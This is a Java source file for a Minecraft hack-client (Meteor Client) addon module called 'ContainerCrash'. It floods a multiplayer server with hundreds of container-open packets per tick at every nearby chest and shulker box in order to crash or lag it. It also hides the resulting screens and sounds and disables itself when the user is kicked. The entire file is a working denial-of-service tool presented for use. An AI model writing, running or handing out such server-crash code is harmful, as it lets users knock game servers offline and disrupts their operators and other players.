package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.game.OpenScreenEvent;
import meteordevelopment.meteorclient.events.world.PlaySoundEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.world.BlockIterator;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.block.AbstractChestBlock;
import net.minecraft.block.Block;
import net.minecraft.block.ShulkerBoxBlock;
import net.minecraft.client.gui.screen.ingame.HandledScreen;
import net.minecraft.client.gui.screen.ingame.InventoryScreen;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import org.lwjgl.glfw.GLFW;

public class ContainerCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount").description("Packets per container block per tick.")
        .defaultValue(100).min(1).sliderMax(1000).build()
    );
    private final Setting<Boolean> noSound = sgGeneral.add(new BoolSetting.Builder()
        .name("no-sound").description("Block container open/close sounds.")
        .defaultValue(false).build()
    );
    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );

    public ContainerCrash() {
        super(AddonTemplate.CRASH_CATEGORY, "container-crash",
            "Spams container-open packets at every chest/shulker in range. Press Escape to stop.");
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null) return;
        if (GLFW.glfwGetKey(mc.getWindow().getHandle(), GLFW.GLFW_KEY_ESCAPE) == GLFW.GLFW_PRESS) {
            toggle();
            mc.player.closeHandledScreen();
            return;
        }
        BlockIterator.register(4, 4, (blockPos, blockState) -> {
            Block block = blockState.getBlock();
            if (!(block instanceof AbstractChestBlock) && !(block instanceof ShulkerBoxBlock)) return;
            BlockHitResult bhr = new BlockHitResult(
                new Vec3d(blockPos.getX(), blockPos.getY(), blockPos.getZ()),
                Direction.DOWN, blockPos, false);
            PlayerInteractBlockC2SPacket pkt = new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, bhr, 0);
            for (int i = 0; i < amount.get(); i++) mc.player.networkHandler.sendPacket(pkt);
        });
    }

    @EventHandler
    private void onScreenOpen(OpenScreenEvent event) {
        if (event.screen == null) return;
        if (!mc.isPaused() && !(event.screen instanceof InventoryScreen)
            && event.screen instanceof HandledScreen) event.setCancelled(true);
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get() && isActive()) toggle();
    }

    @EventHandler
    private void onPlaySound(PlaySoundEvent event) {
        if (!noSound.get()) return;
        String id = event.sound.getId().toString();
        if (id.contains("chest") || id.contains("shulker_box") || id.contains("ender_chest"))
            event.cancel();
    }
}
